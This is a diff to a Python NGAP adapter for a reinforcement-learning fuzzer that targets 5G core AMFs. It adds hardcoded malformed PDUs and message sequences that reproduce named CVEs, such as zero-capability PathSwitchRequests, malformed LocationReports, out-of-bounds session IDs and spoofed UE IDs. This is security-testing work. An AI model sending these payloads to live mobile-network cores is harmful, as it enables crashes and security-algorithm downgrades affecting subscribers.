@@ -50,6 +50,7 @@ PROCEDURE_CODE_VALUES = [
     15,   # id-InitialUEMessage
     46,   # id-UplinkNASTransport
     42,   # id-UEContextReleaseRequest
+    9,    # id-PathSwitchRequest (ella CVE-2026-32319/32320/44475)
     # Fuzzing: wrong/boundary procedure codes (from rules/7,8,9,10)
     0, 4, 6, 29, 41,        # wrong (AMF→gNB codes or undefined)
     127, 128, 255,           # boundary / undefined
@@ -275,15 +276,16 @@ RRC_CAUSE_VALUES = [
 # Procedure code → NGAP message type name (for logging / parse_response)
 _PROC_NAMES = {
     4:  'InitialUEMessage',
-    6:  'NGSetup',
-    9:  'ErrorIndication',
+    6:  'HandoverPreparation',  # unsuccessfulOutcome = HandoverFailure (ella CVE-2026-34761)
+    9:  'PathSwitchRequest',    # ella CVE-2026-32319/32320/44475
     14: 'Paging',
     15: 'InitialContextSetup',
-    21: 'NGSetup',           # successfulOutcome shares code with request
+    21: 'NGSetup',
     25: 'UEContextRelease',
     29: 'UplinkNASTransport',
     41: 'UEContextReleaseRequest',
     46: 'DownlinkNASTransport',
+    62: 'LocationReport',       # ella CVE-2026-33282/33903
 }
 
 # (pdu_choice_byte, proc_code) → human-readable response name
@@ -318,7 +320,8 @@ class NgapAdapter(ProtocolAdapter):
                  plmn_mnc: str = '70',
                  amf_log:  str = '/var/log/open5gs/amf.log',
                  core:     str = 'open5gs',
-                 bin_dir:  Optional[str] = None):
+                 bin_dir:  Optional[str] = None,
+                 go_cover_dir: Optional[str] = None):
         self._gnb_id   = gnb_id
         self._plmn_mcc = plmn_mcc
         self._plmn_mnc = plmn_mnc
@@ -326,8 +329,25 @@ class NgapAdapter(ProtocolAdapter):
         self._bridge   = MmtNgapBridge()
         self._monitor  = NfMonitor(
             core=core, primary_nf='AMF', log_path=amf_log,
-            protocol='ngap', bin_dir=bin_dir,
+            protocol='ngap', bin_dir=bin_dir, go_cover_dir=go_cover_dir,
         )
+        # Go coverage-guided reward (free5GC/ella AMF) — same machinery as the
+        # SBI adapter.  Active only when a GOCOVERDIR with a covmeta is present.
+        import os as _os, glob as _g
+        self._go_cover_dir = go_cover_dir
+        try:
+            self._go_cover_eval_every = max(1, int(_os.environ.get('GO_COVER_EVAL_EVERY', '25')))
+        except ValueError:
+            self._go_cover_eval_every = 25
+        if self._go_cover_dir:
+            if _g.glob(_os.path.join(self._go_cover_dir, 'covmeta.*')):
+                self._monitor.go_cover_campaign_reset()
+                logger.info("go-cover guided reward ON (NGAP, GOCOVERDIR=%s, eval_every=%d)",
+                            self._go_cover_dir, self._go_cover_eval_every)
+            else:
+                logger.warning("go-cover dir %s has no covmeta — disabling go-cover reward.",
+                               self._go_cover_dir)
+                self._go_cover_dir = None
 
         # Templates for decodable procedures: proc_code → raw APER bytes
         # Loaded lazily from 5g-sa.pcap on first build_message() call.
@@ -442,17 +462,29 @@ class NgapAdapter(ProtocolAdapter):
 
     def get_message_types(self) -> List[str]:
         return [
-            'ng_setup',               # NGSetup (proc=21, valid PLMN)
-            'ng_setup_inv',           # NGSetup with wrong/non-configured PLMN
-            'initial_ue',             # InitialUEMessage with Registration Request
-            'ul_nas',                 # UplinkNASTransport (NAS type from fields)
-            'ul_nas_auth',            # UplinkNASTransport: forced NAS Auth Response (0x57)
-            'ul_nas_smc',             # UplinkNASTransport: forced NAS Security Mode Complete (0x5E)
-            'ul_nas_svc',             # UplinkNASTransport: forced NAS Service Request (0x46)
-            'ul_nas_dereg',           # UplinkNASTransport: forced NAS Deregistration Request (0x42)
-            'ul_nas_id',              # UplinkNASTransport: forced NAS Identity Response (0x5C)
-            'pdu_session_setup_resp', # PDUSessionResourceSetupResponse (proc=29, issue #4413)
-            'ue_ctx_release',         # UEContextReleaseRequest
+            'ng_setup',                       # NGSetup (proc=21, valid PLMN)
+            'ng_setup_inv',                   # NGSetup with wrong/non-configured PLMN
+            'initial_ue',                     # InitialUEMessage with Registration Request
+            'initial_ue_short_nas',           # InitialUEMessage: 2-byte truncated NAS (ella CVE-2026-33900)
+            'ul_nas',                         # UplinkNASTransport (NAS type from fields)
+            'ul_nas_auth',                    # UplinkNASTransport: forced NAS Auth Response (0x57)
+            'ul_nas_auth_no_ie',              # UplinkNASTransport: Auth Response with no IE body (ella CVE-2026-32948)
+            'ul_nas_auth_failure',            # UplinkNASTransport: Authentication Failure (0x58, no prior context)
+            'ul_nas_smc',                     # UplinkNASTransport: forced NAS Security Mode Complete (0x5E)
+            'ul_nas_svc',                     # UplinkNASTransport: forced NAS Service Request (0x46)
+            'ul_nas_dereg',                   # UplinkNASTransport: forced NAS Deregistration Request (0x42)
+            'ul_nas_id',                      # UplinkNASTransport: forced NAS Identity Response (0x5C)
+            'pdu_session_setup_resp',         # PDUSessionResourceSetupResponse (proc=29, issue #4413)
+            'pdu_session_setup_resp_spoofed',  # PDUSessionResourceSetupResponse: spoofed max UE IDs (ella CVE-2026-44473)
+            'pdu_session_setup_resp_oob_id',  # PDUSessionResourceSetupResponse: OOB session ID (CVE-2026-33281)
+            'ran_config_update',              # RanConfigurationUpdate: empty + large TAI list (PR #1248)
+            'ue_ctx_release',                 # UEContextReleaseRequest
+            'path_switch_request',            # PathSwitchRequest: zero security caps (ella CVE-2026-32319/32320)
+            'path_switch_request_caps_overwrite', # PathSwitchRequest: all-ones caps overwrite (ella CVE-2026-44475)
+            'location_report',                # LocationReport: missing UEPresenceList (ella CVE-2026-33282)
+            'location_report_malformed',      # LocationReport: fully malformed body (ella CVE-2026-33903)
+            'handover_failure',               # HandoverFailure: unsolicited (ella CVE-2026-34761)
+            'path_switch_no_ies',             # PathSwitchRequest: no UESecurityCapabilities (open5GS #960)
         ]
 
     # ── State transitions ─────────────────────────────────────────────────
@@ -607,6 +639,174 @@ class NgapAdapter(ProtocolAdapter):
                 '(SMF crash: n4-build.c:337, issue #4413)',
                 is_valid=False,
             ),
+
+            # ── ella-core CVE sequences ────────────────────────────────────
+            # Based on CVE-2026-32319 through CVE-2026-44475 (ella GitHub advisories)
+
+            # CVE-2026-33900: InitialUEMessage with 2-byte truncated NAS PDU.
+            # NAS decoder reads declared length but body is only 2 bytes → under-read
+            # or panic in ella's NAS length-check path.
+            StateTransition(
+                'initial_ue_truncated_nas',
+                ['ng_setup', 'initial_ue_short_nas'],
+                'InitialUEMessage with 2-byte truncated NAS PDU (ella CVE-2026-33900)',
+                is_valid=False,
+            ),
+
+            # CVE-2026-32948: Authentication Response sent with zero-length body.
+            # Ella expects at least one IE (RES*) in Auth Response — none present
+            # → nil dereference in the auth handler.
+            StateTransition(
+                'auth_response_no_ie',
+                ['ng_setup', 'initial_ue', 'ul_nas_auth_no_ie'],
+                'NAS Authentication Response with no IE body (ella CVE-2026-32948)',
+                is_valid=False,
+            ),
+
+            # Authentication Failure (msg_type=0x58) without a prior Auth Challenge.
+            # Ella's GMM state machine does not guard against unsolicited Auth Failure
+            # → context lookup on a session that was never started.
+            StateTransition(
+                'auth_failure_no_context',
+                ['ng_setup', 'initial_ue', 'ul_nas_auth_failure'],
+                'NAS Authentication Failure without prior Auth Challenge context',
+                is_valid=False,
+            ),
+
+            # CVE-2026-32319/32320: PathSwitchRequest with all-zero security capabilities.
+            # Ella copies the UE security caps from the switch request into the AMF context
+            # without validating them — zero caps bypass NIA/NEA algorithm selection.
+            StateTransition(
+                'path_switch_zero_caps',
+                ['ng_setup', 'path_switch_request'],
+                'PathSwitchRequest with zero security capabilities (ella CVE-2026-32319/32320)',
+                is_valid=False,
+            ),
+            # Same as above but after a UE is registered — overwrites a live context.
+            StateTransition(
+                'path_switch_zero_caps_after_ue',
+                ['ng_setup', 'initial_ue', 'path_switch_request'],
+                'PathSwitchRequest with zero caps after UE registered — overwrites live context',
+                is_valid=False,
+            ),
+
+            # CVE-2026-44475: PathSwitchRequest with all-ones security caps.
+            # Forces all NIA/NEA algorithms marked as supported → ella selects NIA0
+            # which should be rejected, but the overwrite path skips the check.
+            StateTransition(
+                'path_switch_caps_overwrite',
+                ['ng_setup', 'initial_ue', 'path_switch_request_caps_overwrite'],
+                'PathSwitchRequest overwrites security caps to all-ones (ella CVE-2026-44475)',
+                is_valid=False,
+            ),
+
+            # CVE-2026-33282: LocationReport with missing UEPresenceInAreaOfInterestList.
+            # Ella dereferences the list pointer before checking it is non-nil.
+            StateTransition(
+                'location_report_missing_list',
+                ['ng_setup', 'initial_ue', 'location_report'],
+                'LocationReport without UEPresenceInAreaOfInterestList (ella CVE-2026-33282)',
+                is_valid=False,
+            ),
+            # LocationReport sent without any UE context (before InitialUEMessage).
+            StateTransition(
+                'location_report_no_context',
+                ['ng_setup', 'location_report'],
+                'LocationReport without prior UE context',
+                is_valid=False,
+            ),
+
+            # CVE-2026-33903: Fully malformed LocationReport body.
+            # Only AMF-UE-NGAP-ID and RAN-UE-NGAP-ID present; all mandatory IEs
+            # missing → decoder reaches end-of-buffer while expecting LocationInfo.
+            StateTransition(
+                'location_report_malformed_body',
+                ['ng_setup', 'location_report_malformed'],
+                'LocationReport fully malformed — missing all mandatory IEs (ella CVE-2026-33903)',
+                is_valid=False,
+            ),
+
+            # CVE-2026-34761: HandoverFailure (unsuccessfulOutcome proc=6) without
+            # a prior HandoverRequired / Handover Preparation.  Ella looks up a handover
+            # context that was never created → nil dereference.
+            StateTransition(
+                'handover_failure_unsolicited',
+                ['ng_setup', 'handover_failure'],
+                'HandoverFailure without prior HandoverPreparation (ella CVE-2026-34761)',
+                is_valid=False,
+            ),
+            StateTransition(
+                'handover_failure_after_ue',
+                ['ng_setup', 'initial_ue', 'handover_failure'],
+                'HandoverFailure after UE registration but no HandoverRequired — nil context',
+                is_valid=False,
+            ),
+
+            # CVE-2026-44473: PDUSessionResourceSetupResponse with spoofed max UE IDs
+            # (RAN-UE-NGAP-ID=0xFFFFFFFF, AMF-UE-NGAP-ID=0xFFFFFFFFFF).  Ella looks up
+            # UE context by these IDs; no bounds check → integer overflow in the lookup map.
+            StateTransition(
+                'pdu_session_resp_id_spoof',
+                ['ng_setup', 'pdu_session_setup_resp_spoofed'],
+                'PDUSessionResourceSetupResponse with spoofed max UE IDs (ella CVE-2026-44473)',
+                is_valid=False,
+            ),
+
+            # Combined ella multi-step: register, switch path with zero caps, send
+            # location report, then attempt HandoverFailure — covers several CVE paths
+            # in a single episode.
+            StateTransition(
+                'ella_cve_chain',
+                ['ng_setup', 'initial_ue', 'path_switch_request',
+                 'location_report', 'handover_failure'],
+                'ella CVE chain: UE registration → path switch → location report → handover fail',
+                is_valid=False,
+            ),
+
+            # Issue #1352 (OPEN, unpatched in v1.9.0): nil UESecurityCapability on
+            # re-registration after AMF state loss.  Second InitialUEMessage with the
+            # same RAN-UE-NGAP-ID creates a new GMM context without restoring the UE
+            # security capability; the subsequent AuthResponse triggers BuildSecurityModeCommand
+            # which calls UESecurityCapability.GetLen() on a nil pointer → crash.
+            StateTransition(
+                'reregister_security_nil',
+                ['ng_setup', 'initial_ue', 'ul_nas_auth',
+                 'initial_ue', 'ul_nas_auth'],
+                'Re-registration: second InitialUE→AuthResponse triggers nil UESecurityCapability '
+                '(issue #1352, open in v1.9.0)',
+                is_valid=False,
+            ),
+
+            # CVE-2026-33281: OOB PDU session ID as direct array index → panic.
+            StateTransition(
+                'pdu_session_oob_id',
+                ['ng_setup', 'pdu_session_setup_resp_oob_id'],
+                'PDUSessionResourceSetupResponse with OOB session ID 0/16/255 (CVE-2026-33281)',
+                is_valid=False,
+            ),
+
+            # PR #1248: RanConfigurationUpdate with large TAI/S-NSSAI list → silent truncation.
+            StateTransition(
+                'ran_config_large_tai',
+                ['ng_setup', 'ran_config_update'],
+                'RanConfigurationUpdate with oversized TAI list (PR #1248 truncation fix)',
+                is_valid=False,
+            ),
+
+            # open5GS #960: PathSwitchRequest with no UESecurityCapabilities IE.
+            # Sending with and without prior UE context to exercise both nil-deref paths.
+            StateTransition(
+                'path_switch_no_ies_no_ue',
+                ['ng_setup', 'path_switch_no_ies'],
+                'PathSwitchRequest with no security caps IE, no prior UE context (open5GS #960)',
+                is_valid=False,
+            ),
+            StateTransition(
+                'path_switch_no_ies_after_ue',
+                ['ng_setup', 'initial_ue', 'path_switch_no_ies'],
+                'PathSwitchRequest with no security caps IE after UE registered (open5GS #960)',
+                is_valid=False,
+            ),
         ]
 
     # ── Payload targets ───────────────────────────────────────────────────
@@ -634,12 +834,21 @@ class NgapAdapter(ProtocolAdapter):
     # These all use the UplinkNASTransport APER template (proc=46) but override
     # the NAS message type byte so the sequence reaches a specific GMM handler.
     _NAS_FORCED_TYPES: Dict[str, int] = {
-        'ul_nas_auth':  0x57,   # Authentication Response
-        'ul_nas_smc':   0x5E,   # Security Mode Complete
-        'ul_nas_svc':   0x46,   # Service Request
-        'ul_nas_dereg': 0x42,   # Deregistration Request (UE-initiated)
-        'ul_nas_id':    0x5C,   # Identity Response
+        'ul_nas_auth':         0x57,   # Authentication Response
+        'ul_nas_auth_no_ie':   0x57,   # Authentication Response — zero-length body (ella CVE-2026-32948)
+        'ul_nas_auth_failure': 0x58,   # Authentication Failure — no prior auth context
+        'ul_nas_smc':          0x5E,   # Security Mode Complete
+        'ul_nas_svc':          0x46,   # Service Request
+        'ul_nas_dereg':        0x42,   # Deregistration Request (UE-initiated)
+        'ul_nas_id':           0x5C,   # Identity Response
     }
+
+    # Message types that must produce an empty NAS body regardless of NAS_BODY_VARIANTS.
+    # Used to trigger ella CVE paths where the absence of expected IEs causes a nil dereference.
+    _NAS_NO_BODY_TYPES: frozenset = frozenset({
+        'ul_nas_auth_no_ie',
+        'ul_nas_auth_failure',
+    })
 
     def build_message(self, message_type: str,
                       fields: Dict[str, Any],
@@ -675,11 +884,58 @@ class NgapAdapter(ProtocolAdapter):
             use_malformed = (int(fields.get('ran_ue_ngap_id', 1)) % 2 == 0)
             return self._PROC29_MALFORMED if use_malformed else self._templates.get(29, b'')
 
+        # ── ella CVE direct-return templates (no mmt-dpi decode/encode) ──────
+        # These are hardcoded APER PDUs targeting specific ella crash paths.
+        # Returned as-is; they bypass the mmt-dpi mutation pipeline because
+        # mmt-dpi cannot re-encode exotic procedure codes (9, 6, 62).
+
+        if message_type == 'pdu_session_setup_resp_spoofed':
+            return self._PDU_SESSION_RESP_SPOOFED
+
+        if message_type == 'path_switch_request':
+            return self._templates.get(9, b'')
+
+        if message_type == 'path_switch_request_caps_overwrite':
+            return self._PATH_SWITCH_CAPS_OVERWRITE
+
+        if message_type == 'location_report':
+            return self._templates.get(62, b'')
+
+        if message_type == 'location_report_malformed':
+            return self._LOCATION_REPORT_MALFORMED
+
+        if message_type == 'pdu_session_setup_resp_oob_id':
+            import random as _r
+            return _r.choice(self._PROC29_OOB_IDS)
+
+        if message_type == 'ran_config_update':
+            import random as _r
+            if _r.random() < 0.5:
+                return self._RAN_CONFIG_UPDATE_MINIMAL
+            # Oversized TAI list variant — 200 fake 6-byte TAI entries (PLMN+TAC).
+            # Forces ella's SupportedTAList iterator to handle a list far larger than
+            # any real deployment, exercising the PR #1248 bounds-check path.
+            fake_tai = b'\x99\xf9\x07\x1a\x2b\x3c' * 200   # 1200 bytes
+            vl = len(fake_tai)
+            vb = bytes([0x80 | (vl >> 8), vl & 0xFF])       # APER two-byte length
+            # 1 IE: id=167(SupportedTAList), criticality=reject, value=fake_tai
+            body = b'\x00\x00\x01\x00\xa7\x00' + vb + fake_tai
+            n = len(body)
+            lb = bytes([0x80 | (n >> 8), n & 0xFF])
+            return bytes([0x00, 0x23, 0x40]) + lb + body
+
+        if message_type == 'handover_failure':
+            return self._templates.get(6, b'')
+
+        if message_type == 'path_switch_no_ies':
+            return self._PATH_SWITCH_NO_IES
+
         proc_map = {
             # Standard 3GPP TS 38.413 gNB→AMF procedure codes
-            'initial_ue':    15,   # id-InitialUEMessage
-            'ul_nas':        46,   # id-UplinkNASTransport
-            'ue_ctx_release': 42,  # id-UEContextReleaseRequest
+            'initial_ue':          15,   # id-InitialUEMessage
+            'initial_ue_short_nas': 15,  # same template; NAS PDU overridden below
+            'ul_nas':              46,   # id-UplinkNASTransport
+            'ue_ctx_release':      42,   # id-UEContextReleaseRequest
         }
         # NAS-type alias message types all use the UplinkNASTransport template
         if message_type in self._NAS_FORCED_TYPES:
@@ -719,36 +975,49 @@ class NgapAdapter(ProtocolAdapter):
         #   NAS_BODY_VARIANTS[nas_type] contains per-type crafted bodies.
         #   Variant index = sum(seed_bytes) % len(variants) to avoid the
         #   first-two-bytes collision bug where most seeds mapped to index 3.
-        nas_forced_type = self._NAS_FORCED_TYPES.get(message_type)
-        nas_payload     = payloads.get('nas_container')
 
-        if nas_forced_type is not None or nas_payload is not None:
-            # Determine the NAS message type
-            if nas_forced_type is not None:
-                nas_type = nas_forced_type
-            else:
-                nas_type = int(fields.get('nas_msg_type', 0x41)) & 0xFF
+        # Special case: 2-byte truncated NAS PDU that is missing the message type
+        # byte entirely.  Triggers NAS frame-length checks in ella and open5GS
+        # (CVE-2026-33900-related path at the NAS decoder preamble).
+        if message_type == 'initial_ue_short_nas':
+            msg.nas_pdu.data = bytes([0x7e, 0x01])
+            msg.nas_pdu.size = 2
+        else:
+            nas_forced_type = self._NAS_FORCED_TYPES.get(message_type)
+            nas_payload     = payloads.get('nas_container')
 
-            # Determine the NAS body
-            type_variants = NAS_BODY_VARIANTS.get(nas_type, [])
-            if type_variants:
-                # Use sum of seed bytes for better distribution across variants.
-                # If no seed payload, use a pseudo-random seed from the fields.
-                seed = nas_payload if nas_payload else bytes(
-                    [int(fields.get('ran_ue_ngap_id', 1)) & 0xFF,
-                     int(fields.get('procedure_code', 15)) & 0xFF]
-                )
-                idx = sum(seed) % len(type_variants)
-                nas_body = type_variants[idx]
-            elif nas_payload:
-                nas_body = nas_payload[:200]
-            else:
-                nas_body = bytes([])
+            if nas_forced_type is not None or nas_payload is not None:
+                # Determine the NAS message type
+                if nas_forced_type is not None:
+                    nas_type = nas_forced_type
+                else:
+                    nas_type = int(fields.get('nas_msg_type', 0x41)) & 0xFF
 
-            # NAS-5GS plain header: EPD=0x7e, security_header=0x00, msg_type
-            nas_blob = bytes([0x7e, 0x00, nas_type]) + nas_body
-            msg.nas_pdu.data = nas_blob
-            msg.nas_pdu.size = len(nas_blob)
+                # Determine the NAS body.
+                # _NAS_NO_BODY_TYPES forces an empty body to trigger CVE paths where
+                # the absence of expected IEs causes a nil dereference in the handler.
+                if message_type in self._NAS_NO_BODY_TYPES:
+                    nas_body = bytes([])
+                else:
+                    type_variants = NAS_BODY_VARIANTS.get(nas_type, [])
+                    if type_variants:
+                        # Use sum of seed bytes for better distribution across variants.
+                        # If no seed payload, use a pseudo-random seed from the fields.
+                        seed = nas_payload if nas_payload else bytes(
+                            [int(fields.get('ran_ue_ngap_id', 1)) & 0xFF,
+                             int(fields.get('procedure_code', 15)) & 0xFF]
+                        )
+                        idx = sum(seed) % len(type_variants)
+                        nas_body = type_variants[idx]
+                    elif nas_payload:
+                        nas_body = nas_payload[:200]
+                    else:
+                        nas_body = bytes([])
+
+                # NAS-5GS plain header: EPD=0x7e, security_header=0x00, msg_type
+                nas_blob = bytes([0x7e, 0x00, nas_type]) + nas_body
+                msg.nas_pdu.data = nas_blob
+                msg.nas_pdu.size = len(nas_blob)
 
         # 4. Re-encode with mmt-dpi (ASN.1 APER)
         encoded = self._bridge.encode(msg, template)
@@ -832,7 +1101,8 @@ class NgapAdapter(ProtocolAdapter):
             'error_indication':        (True,  1.0),  # Expected for malformed messages
             'ue_ctx_release_command':  (True,  1.0),
             'ue_ctx_release_complete': (True,  0.5),
-            'ng_setup_response':       (True,  0.5),  # Normal success — not interesting
+            'ng_setup_response':       (True,  2.0),  # Session established — gateway to deep states
+            'closed':                  (False,-0.5),  # APER decode failure — dead end, discourage
             'refused':                 (False, 0.2),
         }
 
@@ -860,20 +1130,26 @@ class NgapAdapter(ProtocolAdapter):
         elif response_time_ms > 50:
             reward += 12.0
 
-        # Boundary value bonus for NGAP-specific fields
-        if field_mutations.get('ran_ue_ngap_id') in {0, 0x7FFFFFFF, 0xFFFFFFFF}:
-            reward += 5.0
-        if field_mutations.get('procedure_code') in {0, 127, 128, 255}:
-            reward += 5.0
-        if field_mutations.get('amf_ue_ngap_id') in {0, 0xFFFFFFFFFF}:
-            reward += 5.0
-        # PDU choice byte fuzzing bonus (sending successfulOutcome from gNB)
-        if field_mutations.get('pdu_present') in {0x20, 0x40, 0x60, 0xFF}:
-            reward += 5.0
+        # Field and payload bonuses only apply when ella actually processed the PDU.
+        # A 'closed' response means APER decode failed at the transport layer —
+        # the payload never reached the NGAP dispatcher, so rewarding field mutations
+        # or NAS injection on a closed connection creates a stable reward-exploit
+        # (agent learns to spam seq_payload:nas_container for free +8 per step).
+        if response.get('type') != 'closed':
+            # Boundary value bonus for NGAP-specific fields
+            if field_mutations.get('ran_ue_ngap_id') in {0, 0x7FFFFFFF, 0xFFFFFFFF}:
+                reward += 5.0
+            if field_mutations.get('procedure_code') in {0, 127, 128, 255}:
+                reward += 5.0
+            if field_mutations.get('amf_ue_ngap_id') in {0, 0xFFFFFFFFFF}:
+                reward += 5.0
+            # PDU choice byte fuzzing bonus (sending successfulOutcome from gNB)
+            if field_mutations.get('pdu_present') in {0x20, 0x40, 0x60, 0xFF}:
+                reward += 5.0
 
-        # NAS payload injection bonus
-        if payload_injections.get('nas_container'):
-            reward += 8.0
+            # NAS payload injection bonus
+            if payload_injections.get('nas_container'):
+                reward += 8.0
 
         # Crash detected by process monitor — highest reward signal
         if self._monitor.detect_crash():
@@ -912,6 +1188,20 @@ class NgapAdapter(ProtocolAdapter):
             score = self._monitor.anomaly_score()
             if score > 0:
                 reward += score * 80.0
+
+            # Go coverage-guided bonus (free5GC/ella AMF) — SIGUSR2-dump the
+            # -cover AMF, diff new covered blocks, reward them.  Same weights as
+            # the SBI adapter (+10/block, cap +80, covdata every eval_every steps).
+            if self._go_cover_dir:
+                go_locs = self._monitor.go_cover_new_lines(
+                    dump_first=True, eval_every=self._go_cover_eval_every)
+                if go_locs:
+                    go_bonus = min(len(go_locs) * 10.0, 80.0)
+                    reward += go_bonus
+                    logger.info(
+                        "go-cover +%.0f reward | %d new blocks | %d total covered",
+                        go_bonus, len(go_locs), self._monitor.go_cover_count,
+                    )
 
         return reward
 
@@ -1029,6 +1319,41 @@ class NgapAdapter(ProtocolAdapter):
         # The two templates are selected by build_message() based on the payload seed.
         29: bytes.fromhex('201d400f000002000a00020001005500020001'),          # Template A (minimal)
         # Template B is accessed via _PROC29_MALFORMED below
+
+        # PathSwitchRequest (proc=9, initiatingMessage): all-zero UESecurityCapabilities.
+        # CVE-2026-32319/32320: ella copies caps from the switch request without
+        # validation — zero caps bypass algorithm selection and overwrite AMF context.
+        # Fields: AMF-UE-NGAP-ID=1 (5-byte), RAN-UE-NGAP-ID=1 (4-byte),
+        #         UESecurityCapabilities = 9-byte IE with all zeros.
+        9: bytes.fromhex(
+            '000900200003'
+            '000a00050000000001'     # AMF-UE-NGAP-ID=1 (40-bit APER)
+            '005500040000000100'     # RAN-UE-NGAP-ID=1 (32-bit APER) + IE separator
+            '7740090000000000'       # UESecurityCapabilities IE (id=0x77): len=9, all zeros
+            '00000000'
+        ),
+
+        # LocationReport (proc=62, initiatingMessage): mandatory IEs present but
+        # UEPresenceInAreaOfInterestList is missing.
+        # CVE-2026-33282: ella dereferences the list pointer before nil-check.
+        # Fields: AMF-UE-NGAP-ID=1, RAN-UE-NGAP-ID=1,
+        #         LocationReportingRequestType IE (id=0x5b) with EventType=direct (0x80).
+        62: bytes.fromhex(
+            '003e40190003'
+            '000a00050000000001'     # AMF-UE-NGAP-ID=1
+            '005500040000000100'     # RAN-UE-NGAP-ID=1
+            '5b40028000'             # LocationReportingRequestType IE: len=2, EventType=direct
+        ),
+
+        # HandoverFailure (proc=6, unsuccessfulOutcome=0x40): AMF-UE-NGAP-ID=1,
+        # Cause=radioNetwork:unspecified.
+        # CVE-2026-34761: sent without a prior HandoverRequired → ella looks up a
+        # handover context that was never created → nil dereference.
+        6: bytes.fromhex(
+            '400600110002'
+            '000a00050000000001'     # AMF-UE-NGAP-ID=1
+            '000f40020000'           # Cause IE: radioNetwork(0), unspecified(0)
+        ),
     }
 
     # PDUSessionResourceSetupResponse with malformed QoS transfer (issue #4413).
@@ -1042,6 +1367,77 @@ class NgapAdapter(ProtocolAdapter):
         '004b400401000000'          # PDUSessionResourceSetupListSURes: id=75, crit=ignore,
                                     #   len=4, value=PDU-session-ID=1 + 3-byte truncated transfer
                                     #   (no upTNLInformation → SMF assertion at n4-build.c:337)
+    )
+
+    # PathSwitchRequest with all-ones UESecurityCapabilities.
+    # CVE-2026-44475: forces all NIA/NEA bits set → ella selects NIA0 on the
+    # overwrite path which bypasses the NIA0-rejection check that fires on initial
+    # registration (the overwrite path skips the guard).
+    _PATH_SWITCH_CAPS_OVERWRITE = bytes.fromhex(
+        '000900200003'
+        '000a00050000000001'     # AMF-UE-NGAP-ID=1
+        '005500040000000100'     # RAN-UE-NGAP-ID=1
+        '7740090000000000'       # UESecurityCapabilities IE: len=9
+        'ffffffff'               # NR-EncryptionAlgorithms + NR-IntegrityProtectionAlgorithms = all 1s
+        'ff'                     # E-UTRA-EncryptionAlgorithms (padding byte)
+    )
+
+    # LocationReport: fully malformed body — only AMF/RAN UE IDs, all mandatory
+    # LocationInfo IEs absent.
+    # CVE-2026-33903: decoder reaches end-of-buffer while expecting LocationInfo
+    # → panic/out-of-bounds access in ella's NGAP decoder.
+    _LOCATION_REPORT_MALFORMED = bytes.fromhex(
+        '003e40130002'
+        '000a00050000000001'     # AMF-UE-NGAP-ID=1
+        '005500040000000100'     # RAN-UE-NGAP-ID=1
+                                 # LocationInfo IE intentionally absent
+    )
+
+    # PDUSessionResourceSetupResponse variants with OOB PDU Session IDs.
+    # CVE-2026-33281: ella used the PDU session ID as a direct array index without
+    # bounds checking — IDs outside the valid 3GPP range 1–15 caused array OOB panic.
+    # Each template is identical to _PROC29_MALFORMED except for the session-ID byte.
+    _PROC29_OOB_IDS = [
+        bytes.fromhex(                                # ID=0 (below minimum)
+            '201d4017000003000a00020001005500020001'
+            '004b400400000000'
+        ),
+        bytes.fromhex(                                # ID=16 (above maximum 15)
+            '201d4017000003000a00020001005500020001'
+            '004b400410000000'
+        ),
+        bytes.fromhex(                                # ID=255 (max uint8, far OOB)
+            '201d4017000003000a00020001005500020001'
+            '004b4004ff000000'
+        ),
+    ]
+
+    # PathSwitchRequest with NO UESecurityCapabilities IE — only AMF/RAN UE IDs.
+    # open5GS GitHub issue #960: memory corruption when PathSwitchRequest has
+    # valid UE context IDs but no UESecurityCapabilities IE.  Ella dereferences
+    # the absent caps pointer in the PathSwitch handler → nil deref.
+    # IE count=2, value len=19: AMF-UE-NGAP-ID(9) + RAN-UE-NGAP-ID(8).
+    _PATH_SWITCH_NO_IES = bytes.fromhex(
+        '00090013'              # init, proc=9, crit=reject, value-len=19
+        '0002'                  # 2 IEs
+        '000a00050000000001'    # AMF-UE-NGAP-ID=1 (40-bit)
+        '0055000400000001'      # RAN-UE-NGAP-ID=1 (32-bit)
+    )
+
+    # RanConfigurationUpdate (proc=35, initiatingMessage), no IEs.
+    # PR #1248: large SupportedTAList / S-NSSAI lists caused silent truncation in
+    # ella's handler. The minimal variant exercises the empty-handler path; build_message
+    # also dynamically constructs an oversized TAI-list variant.
+    _RAN_CONFIG_UPDATE_MINIMAL = bytes.fromhex('00234003000000')
+
+    # PDUSessionResourceSetupResponse with spoofed max-value UE IDs.
+    # CVE-2026-44473: RAN-UE-NGAP-ID=0xFFFFFFFF, AMF-UE-NGAP-ID=0xFFFFFFFFFF.
+    # Ella looks up UE context by ID without bounds check → integer overflow
+    # or OOB access in the AMF context lookup table.
+    _PDU_SESSION_RESP_SPOOFED = bytes.fromhex(
+        '201d00130002'
+        '000a4005ffffffffff'     # AMF-UE-NGAP-ID=0xFFFFFFFFFF (max 40-bit)
+        '00554004ffffffff'       # RAN-UE-NGAP-ID=0xFFFFFFFF (max 32-bit)
     )
 
     # Original PLMN in the builtin templates (MCC=999 MNC=70)
